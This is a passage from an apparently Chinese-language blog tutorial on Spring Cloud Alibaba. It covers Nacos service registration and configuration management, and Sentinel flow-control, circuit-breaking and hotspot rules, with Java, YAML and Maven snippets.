class="string">http://nacos-payment-provider</span></span><br></pre></td></tr></table></figure>

<h5 id="在主启动类开启Nacos服务注册支持-1"><a href="#在主启动类开启Nacos服务注册支持-1" class="headerlink" title="在主启动类开启Nacos服务注册支持"></a>在主启动类开启Nacos服务注册支持</h5><p>和consul一样，使用注解<code>@EnableDiscoveryClient</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main9001</span></span><br><span class="line">&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>启动服务，在<code>http://localhost:8848/nacos/</code>网址，服务管理-服务列表中即可看到服务注册成功</p>
<h5 id="服务调用"><a href="#服务调用" class="headerlink" title="服务调用"></a>服务调用</h5><p>类似consul的学习过程，现在先使用RestTemplate实现服务调用，编写配置文件如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span> <span class="comment">//赋予RestTemplate负载均衡的能力</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务调用如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderNacosController</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;service-url.nacos-user-service&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String serverURL;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/consumer/pay/nacos/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">paymentInfo</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> restTemplate.getForObject(serverURL + <span class="string">&quot;/pay/nacos/&quot;</span> + id, String.class);</span><br><span class="line">        <span class="keyword">return</span> result + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;    我是OrderNacosController83调用者。。。。。。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h4><p>为进行负载均衡演示，需要两个服务提供者，在IDEA中可以快速克隆服务：下边栏-服务，右键需要克隆的服务，复制配置：注意，VM选项中需要说明新服务运行端口<code>-DServer.port=</code></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250303161249.png"></p>
<p>应用即可。</p>
<p>上述配置中，在服务消费者注册时，RestTemplate中已经使用<code>@LoadBalanced</code>注解开启负载均衡配置，因此无需其他操作，访问服务消费者模块对应网页即可见其实现了负载均衡</p>
<h3 id="Config服务配置中心"><a href="#Config服务配置中心" class="headerlink" title="Config服务配置中心"></a>Config服务配置中心</h3><p>Nacos可以实现类似Consul一样的配置管理，本节相当于[cloud2-consul服务注册与发现-分布式配置]章节</p>
<p>微服务意味着要将单体应用中的业务拆分成一个个子服务，每个服务的粒度相对较小，因此系统中会出现大量的服务。由于每个服务都需要必要的配置信息才能运行，所以一套集中式的、动态的配置管理设施是必不可少的。比如某些配置文件中的内容大部分都是相同的，只有个别的配置项不同。就拿数据库配置来说吧，如果每个微服务使用的技术栈都是相同的，则每个微服务中关于数据库的配置几乎都是相同的，有时候主机迁移了，我希望<strong>一次修改，处处生效</strong>。</p>
<h5 id="引入三个依赖"><a href="#引入三个依赖" class="headerlink" title="引入三个依赖"></a><strong>引入三个依赖</strong></h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--bootstrap--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-bootstrap<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--nacos-config--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--nacos-discovery--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="编写application-yaml和bootstrap-yaml"><a href="#编写application-yaml和bootstrap-yaml" class="headerlink" title="编写application.yaml和bootstrap.yaml"></a>编写application.yaml和bootstrap.yaml</h5><p>类似模块[cloud-provider-payment8001]</p>
<p><strong>bootstrap.yaml：</strong>与nacos和服务器相关的是配置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nacos配置</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos服务注册中心地址</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment"># Nacos作为配置中心地址</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span> <span class="comment"># 指定yaml格式的配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nacos端配置文件DataId的命名规则是：</span></span><br><span class="line"><span class="comment"># $&#123;spring.application.name&#125;-$&#123;spring.profile.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line"><span class="comment"># 本案例的DataID是:nacos-config-client-dev.yaml</span></span><br></pre></td></tr></table></figure>

<p><strong>application.yaml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3377</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span> <span class="comment"># 表示开发环境</span></span><br><span class="line">    <span class="comment">#active: prod # 表示生产环境</span></span><br><span class="line">    <span class="comment">#active: test # 表示测试环境</span></span><br></pre></td></tr></table></figure>



<h5 id="在Nacos服务器中添加配置。"><a href="#在Nacos服务器中添加配置。" class="headerlink" title="在Nacos服务器中添加配置。"></a>在Nacos服务器中添加配置。</h5><p>在nacos中添加配置必须严格按照规定的格式：</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250303193635.png"></p>
<p>填写方式如下</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250303194135.png"></p>
<h5 id="开启配置动态刷新"><a href="#开启配置动态刷新" class="headerlink" title="开启配置动态刷新"></a>开启配置动态刷新</h5><p>在controller类前添加注解<code>@RefreshScope</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 在控制器类加入@RefreshScope注解使当前类下的配置支持Nacos的动态刷新功能。</span></span><br><span class="line"><span class="meta">@RefreshScope</span></span><br></pre></td></tr></table></figure>





<h3 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h3><p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250303221737.png"></p>
<table>
<thead>
<tr>
<th>1 是什么</th>
<th>类似Java里面的package名和类名，最外层的Namespace是可以用于区分部署环境的，Group和DataID逻辑上区分两个目标对象</th>
</tr>
</thead>
<tbody><tr>
<td>2 默认值</td>
<td>默认情况：Namespace&#x3D;public，Group&#x3D;DEFAULT_GROUPNacos默认的命名空间是public，Namespace主要用来实现隔离。比方说我们现在有三个环境：开发、测试、生产环境，我们就可以创建三个Namespace，不同的Namespace之间是隔离的。Group默认是DEFAULT_GROUP，Group可以把不同的微服务划分到同一个分组里面去</td>
</tr>
<tr>
<td>Service就是微服务</td>
<td>一个Service可以包含一个或者多个Cluster（集群），Nacos默认Cluster是DEFAULT，Cluster是对指定微服务的一个虚拟划分。见下一节：服务领域模型-补充说明</td>
</tr>
</tbody></table>
<p><img src="D:\workinenglish\typora_image\image-20250303222850024.png" alt="image-20250303222850024"></p>
<h4 id="DataID加载配置"><a href="#DataID加载配置" class="headerlink" title="DataID加载配置"></a>DataID加载配置</h4><p>通过指定spring.profile.active和配置文件的DataId来使不同环境读取不同配置</p>
<p>上述即为按照DataID加载不同配置的情况，所有的配置都在默认命名空间的默认组DEFAULT_GROUP里面</p>
<h4 id="Group加载配置"><a href="#Group加载配置" class="headerlink" title="Group加载配置"></a>Group加载配置</h4><p>在Nacos控制网页新建配置时，在Group栏输入同样的字符即代表在同一组，</p>
<p><strong>yaml配置文件修改如下：</strong></p>
<p><code>bootstrap.yaml</code>: 在<code>config</code>下新增一条<code>group</code>的配置即可</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos服务注册中心地址</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos作为配置中心地址</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span> <span class="comment">#指定yaml格式的配置</span></span><br><span class="line">        <span class="attr">group:</span> <span class="string">GROUP_NAME</span>  <span class="comment"># 这里</span></span><br></pre></td></tr></table></figure>



<h4 id="NameSpace加载配置"><a href="#NameSpace加载配置" class="headerlink" title="NameSpace加载配置"></a>NameSpace加载配置</h4><p>在Nacos控制网页-命名空间，新建命名空间，然后在新建配置时选择同一个命名空间的配置在同一命名空间。</p>
<p><strong>yaml配置文件修改如下：</strong></p>
<p><code>bootstrap.yaml</code>: 在<code>config</code>下新增一条<code>namespace</code>的配置即可</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nacos配置</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos服务注册中心地址</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos作为配置中心地址</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span> <span class="comment">#指定yaml格式的配置</span></span><br><span class="line">        <span class="attr">namespace:</span> <span class="string">NAMESPACE_NAME</span></span><br></pre></td></tr></table></figure>







<h2 id="Sentinel实现熔断与限流"><a href="#Sentinel实现熔断与限流" class="headerlink" title="Sentinel实现熔断与限流"></a>Sentinel实现熔断与限流</h2><h3 id="简介和配置"><a href="#简介和配置" class="headerlink" title="简介和配置"></a>简介和配置</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p><a href="http://sentinelguard.io/zh-cn/">官网</a>   <a href="https://github.com/alibaba/sentinel/wiki/%E4%B8%BB%E9%A1%B5">中文介绍</a></p>
<p>随着微服务的流行，服务和服务之间的稳定性变得越来越重要。<a href="https://sentinelguard.io/">Sentinel</a> 是面向分布式、多语言异构化服务架构的流量治理组件，主要以流量为切入点，从流量路由、流量控制、流量整形、熔断降级、系统自适应过载保护、热点流量防护等多个维度来帮助开发者保障微服务的稳定性。</p>
<p><strong>思想：</strong></p>
<p>流量控制在网络传输中是一个常用的概念，它用于调整网络包的发送数据。然而，从系统稳定性角度考虑，在处理请求的速度上，也有非常多的讲究。任意时间到来的请求往往是随机不可控的，而系统的处理能力是有限的。我们需要根据系统的处理能力对流量进行控制。Sentinel 作为一个调配器，可以根据需要把随机的请求调整成合适的形状，如下图所示：</p>
<p><img src="https://github.com/alibaba/Sentinel/wiki/image/limitflow.gif" alt="img"></p>
<h5 id="下载安装运行"><a href="#下载安装运行" class="headerlink" title="下载安装运行"></a>下载安装运行</h5><p><a href="https://github.com/alibaba/sentinel/releases">github下载</a>  <code>java -jar java -jar sentinel-dashboard-1.8.8.jar</code>运行，在</p>
<p><code>http://localhost:8080</code>查看，默认用户名密码均为sentinel</p>
<h5 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h5><ul>
<li><strong>流控规则</strong>（Flow Rule）主要用于限制资源的访问频率。</li>
<li><strong>熔断规则</strong>（Degrade Rule）用于在服务出现异常时自动触发降级策略。</li>
<li><strong>热点参数规则</strong>（Param Flow Rule）用于对特定参数进行限流。</li>
<li><strong>授权规则</strong>（Authority Rule）用于基于应用名称进行访问控制。</li>
<li><strong>系统规则</strong>（System Rule）用于监控系统的整体健康状况，如 CPU 使用率、系统负载等。</li>
</ul>
<h4 id="服务提供者纳入哨兵监控"><a href="#服务提供者纳入哨兵监控" class="headerlink" title="服务提供者纳入哨兵监控"></a>服务提供者纳入哨兵监控</h4><h5 id="导入依赖包："><a href="#导入依赖包：" class="headerlink" title="导入依赖包："></a>导入依赖包：</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringCloud alibaba sentinel --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-sentinel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="配置文件指定Sentinel运行端口"><a href="#配置文件指定Sentinel运行端口" class="headerlink" title="配置文件指定Sentinel运行端口"></a>配置文件指定Sentinel运行端口</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">sentinel:</span></span><br><span class="line">    <span class="attr">transport:</span></span><br><span class="line">      <span class="comment"># 配置Sentinel dashboard控制台服务地址</span></span><br><span class="line">      <span class="attr">dashboard:</span> <span class="string">localhost:8080</span> </span><br><span class="line">      <span class="comment"># Sentinel 客户端与 Sentinel 控制台通信时使用的端口，默认8719</span></span><br><span class="line">      <span class="comment"># 假如被占用会自动从8719开始依次+1扫描,直至找到未被占用的端口</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">8719</span> </span><br></pre></td></tr></table></figure>

<p><code>port: 8719</code> 是客户端用于与该控制台 gRPC 通信的本地端口， Sentinel 客户端通过此端口将流量数据、规则配置等信息上报给 Sentinel 控制台，从而实现对服务的实时监控和动态规则调整。</p>
<h5 id="查看Sentinel监控"><a href="#查看Sentinel监控" class="headerlink" title="查看Sentinel监控"></a>查看Sentinel监控</h5><p>Sentinel采取的是懒加载监控方式，必须先访问接口才能开始监控，因此需要先访问接口再查看监控情况</p>
<h3 id="SentinelResource注解的使用"><a href="#SentinelResource注解的使用" class="headerlink" title="@SentinelResource注解的使用"></a>@SentinelResource注解的使用</h3><p><code>@SentinelResource</code> 是 Spring Cloud Alibaba Sentinel 提供的一个注解，用于定义资源并配置流量控制、熔断降级等规则。通过该注解，可以方便地对方法进行限流和降级处理。</p>
<p><strong>参数说明</strong></p>
<ul>
<li><strong>value</strong>：资源名称，用于标识被保护的资源。</li>
<li><strong>blockHandler</strong>：指定一个处理限流或降级的函数，必须是同类中的方法，且参数列表需包含 <code>BlockException</code> 类型的参数。</li>
<li><strong>fallback</strong>：指定一个回退方法，用于处理业务异常或其他异常，方法签名应与原方法一致，但最后一个参数为 <code>Throwable</code> 类型。</li>
<li><strong>defaultFallback</strong>：全局默认的回退方法，适用于多个资源共用一个回退逻辑的情况。</li>
</ul>
<h4 id="按rest地址限流-默认限流返回"><a href="#按rest地址限流-默认限流返回" class="headerlink" title="按rest地址限流+默认限流返回"></a>按rest地址限流+默认限流返回</h4><p>此时不需要<code>@SentinelResource</code>注解也可以实现，因为rest地址（即<code>@GetMapping()</code>）本就唯一，不可重复。默认情况下限流开始时返回<code>Blocked by Sentinel (flow limiting)</code>。</p>
<h4 id="按SentinelResource的资源名-value-自定义限流返回"><a href="#按SentinelResource的资源名-value-自定义限流返回" class="headerlink" title="按SentinelResource的资源名(value)+自定义限流返回"></a>按SentinelResource的资源名(value)+自定义限流返回</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/limit/resource&quot;)</span></span><br><span class="line"><span class="meta">@SentinelResource(value = &quot;byResource&quot;,blockHandler = &quot;blockHandlerFunction&quot;)</span></span><br><span class="line"><span class="comment">// blockHandler的值即自定义限流返回方法名</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">bySource</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;按资源名限流并使用自定义限流返回&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">blockHandlerFunction</span><span class="params">(BlockException blockException)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;服务不可用，限流中&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置：</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250305214844.png"></p>
<h4 id="按SentinelResource的资源名-value-自定义限流返回-服务降级处理"><a href="#按SentinelResource的资源名-value-自定义限流返回-服务降级处理" class="headerlink" title="按SentinelResource的资源名(value)+自定义限流返回+服务降级处理"></a>按SentinelResource的资源名(value)+自定义限流返回+服务降级处理</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/limit/doAction/&#123;p1&#125;&quot;)</span></span><br><span class="line"><span class="meta">@SentinelResource(value = &quot;doActionSentinelResource&quot;,</span></span><br><span class="line"><span class="meta">        blockHandler = &quot;doActionBlockHandler&quot;, fallback = &quot;doActionFallback&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">doAction</span><span class="params">(<span class="meta">@PathVariable(&quot;p1&quot;)</span> Integer p1)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p1 == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;p1等于零直接异常&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;doAction&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">doActionBlockHandler</span><span class="params">(<span class="meta">@PathVariable(&quot;p1&quot;)</span> Integer p1, BlockException e)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;sentinel配置自定义限流了&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">doActionFallback</span><span class="params">(<span class="meta">@PathVariable(&quot;p1&quot;)</span> Integer p1,Throwable e)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;程序逻辑异常了&quot;</span>+<span class="string">&quot;\t&quot;</span>+e.getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>blockHandler</code> 和<code>fallback</code>的区别</p>
<ul>
<li><p><strong>blockHandler</strong>：该属性指向的方法会在请求被 Sentinel 限流或者降级时触发执行。简单来说，当请求超过了预设的阈值（如QPS过高），或者某些规则（如熔断规则）触发导致请求被拒绝时，会执行此方法。</p>
</li>
<li><p><strong>fallback</strong>：这个属性对应的方法会在调用过程中发生异常（比如空指针异常、除零错误等业务异常）或 Sentinel 规则（如流量控制、服务熔断）生效时触发执行。但是，与 <code>blockHandler</code> 不同的是，它更倾向于捕捉和处理业务逻辑中的异常，为用户提供一个友好的响应或备用方案。</p>
</li>
</ul>
<p><strong>何时执行：</strong></p>
<ul>
<li>当因流量控制或服务熔断等原因被 Sentinel 拒绝时，会执行 <code>blockHandler</code> 所指定的方法。</li>
<li>而当出现业务逻辑异常或任何未预料的运行时异常时，则会执行 <code>fallback</code> 方法。</li>
</ul>
<h3 id="流控规则"><a href="#流控规则" class="headerlink" title="流控规则"></a>流控规则</h3><h4 id="流控模式"><a href="#流控模式" class="headerlink" title="流控模式"></a>流控模式</h4><p>在Sentinel控制态可以新增流控规则，可以有三种流控模式：直接、关联、链路</p>
<h5 id="直接模式"><a href="#直接模式" class="headerlink" title="直接模式"></a>直接模式</h5><p>默认的流控模式，当接口达到限流条件时，直接开启限流功能。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250304231421.png"></p>
<h5 id="关联模式"><a href="#关联模式" class="headerlink" title="关联模式"></a>关联模式</h5><p>当关联的资源达到阈值时，限流自己&#x3D;》A病B吃药</p>
<p>只需要选择关联模式并输入关联资源URL即可</p>
<h5 id="链路模式"><a href="#链路模式" class="headerlink" title="链路模式"></a>链路模式</h5><p>当来自不同链路的请求对同一目标访问时，实施针对性的不同限流措施。即来自某些链路的请求就限流，某些就不限流</p>
<p><strong>步骤1：</strong>修改yaml配置，添加<code>transport</code>同级配置。非必要，视情况决定</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">web-context-unify:</span> <span class="literal">false</span> <span class="comment"># controller层的方法对service层调用不认为是同一个根链路</span></span><br></pre></td></tr></table></figure>

<p><strong>演示步骤1：</strong>创建service层方法如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowLimitService</span> &#123;</span><br><span class="line">    <span class="meta">@SentinelResource(value = &quot;common&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">common</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;------FlowLimitService come in&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>演示步骤2：</strong>Controller层调用service层方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span> FlowLimitService flowLimitService;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/testC&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testC</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    flowLimitService.common();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;------testC&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤2</strong>：在控制台新增链路模式流控规则，资源名填写<code>@SentinelResource</code>的<code>value</code>属性值， 入口资源填写其来自的链路URL(\testC)。</p>
<h4 id="流控效果"><a href="#流控效果" class="headerlink" title="流控效果"></a>流控效果</h4><h5 id="快速失败"><a href="#快速失败" class="headerlink" title="快速失败"></a>快速失败</h5><p>请求直接失败并抛出异常，默认结果</p>
<h5 id="WarmUp预热"><a href="#WarmUp预热" class="headerlink" title="WarmUp预热"></a>WarmUp预热</h5><p><a href="https://github.com/alibaba/Sentinel/wiki/%E9%99%90%E6%B5%81---%E5%86%B7%E5%90%AF%E5%8A%A8">官网</a></p>
<p>当系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过”冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。</p>
<p>选择warmup流程效果，设置预热时长，默认情况下，流量上限从阈值的三分之一开始，经预热时长后升到阈值上限为止。</p>
<h5 id="排队等待"><a href="#排队等待" class="headerlink" title="排队等待"></a>排队等待</h5><p><a href="https://github.com/alibaba/Sentinel/wiki/%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6-%E5%8C%80%E9%80%9F%E6%8E%92%E9%98%9F%E6%A8%A1%E5%BC%8F">官网</a></p>
<p>控制请求匀速访问，以固定的间隔时间让请求通过。当请求到来的时候：</p>
<ul>
<li>如果当前请求距离上个通过的请求通过的时间间隔不小于预设值，则让当前请求通过；</li>
<li>否则，计算当前请求的预期通过时间，<ul>
<li>如果该请求的预期通过时间小于规则预设的 timeout 时间，则该请求会等待直到预设时间到来通过（排队等待处理）；</li>
<li>若预期的通过时间超出最大排队时长，则直接拒接这个请求。</li>
</ul>
</li>
</ul>
<h3 id="熔断规则"><a href="#熔断规则" class="headerlink" title="熔断规则"></a>熔断规则</h3><p><a href="https://sentinelguard.io/zh-cn/docs/circuit-breaking.html">官网</a></p>
<p>采取的熔断策略和CircuitBreaker一致：</p>
<h4 id="慢调用比例"><a href="#慢调用比例" class="headerlink" title="慢调用比例"></a>慢调用比例</h4><p>当业务逻辑的处理时间超过最大RT时，将其判定为慢调用。在统计时长内，慢调用的比例高于比例阈值，且实际请求数目大于设定的最小请求数时，触发熔断。</p>
<p>慢调用比例 (<code>SLOW_REQUEST_RATIO</code>)：选择以慢调用比例作为阈值，需要设置允许的慢调用 RT（即最大的响应时间），请求的响应时间大于该值则统计为慢调用。当单位统计时长（<code>statIntervalMs</code>）内请求数目大于设置的最小请求数目，并且慢调用的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求响应时间小于设置的慢调用 RT 则结束熔断，若大于设置的慢调用 RT 则会再次被熔断。</p>
<h4 id="异常比例"><a href="#异常比例" class="headerlink" title="异常比例"></a>异常比例</h4><p>异常比例 (<code>ERROR_RATIO</code>)：当单位统计时长（<code>statIntervalMs</code>）内请求数目大于设置的最小请求数目，并且异常的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。异常比率的阈值范围是 <code>[0.0, 1.0]</code>，代表 0% - 100%。</p>
<p>注意异常降级<strong>仅针对业务异常</strong>，对 Sentinel 限流降级本身的异常（<code>BlockException</code>）不生效。为了统计异常比例或异常数，需要通过 <code>Tracer.trace(ex)</code> 记录业务异常。</p>
<h4 id="异常数"><a href="#异常数" class="headerlink" title="异常数"></a>异常数</h4><p>异常数 (<code>ERROR_COUNT</code>)：当单位统计时长内的异常数目超过阈值之后会自动进行熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。</p>
<h3 id="热点规则"><a href="#热点规则" class="headerlink" title="热点规则"></a>热点规则</h3><p><a href="https://sentinelguard.io/zh-cn/docs/parameter-flow-control.html">官方文档</a></p>
<p>热点即经常访问的数据，很多时候我们希望统计或者限制某个热点数据中访问频次最高的TopN数据，并对其访问进行限流或者其它操作。</p>
<p>针对热点参数的限流操作：</p>
<ul>
<li><p>如果请求参数<strong>包含</strong>被限流的参数（下文为p1），且满足限流条件，则开始限流，如：</p>
<p>  <code>http://localhost:8401/testHotKey?p2=1&amp;p1=1</code>或<code>http://localhost:8401/testHotKey?p1=1</code></p>
</li>
<li><p>如果请求参数<strong>不包含</strong>被限流的参数（下文为p1），即使满足限流条件也不会限流，如：</p>
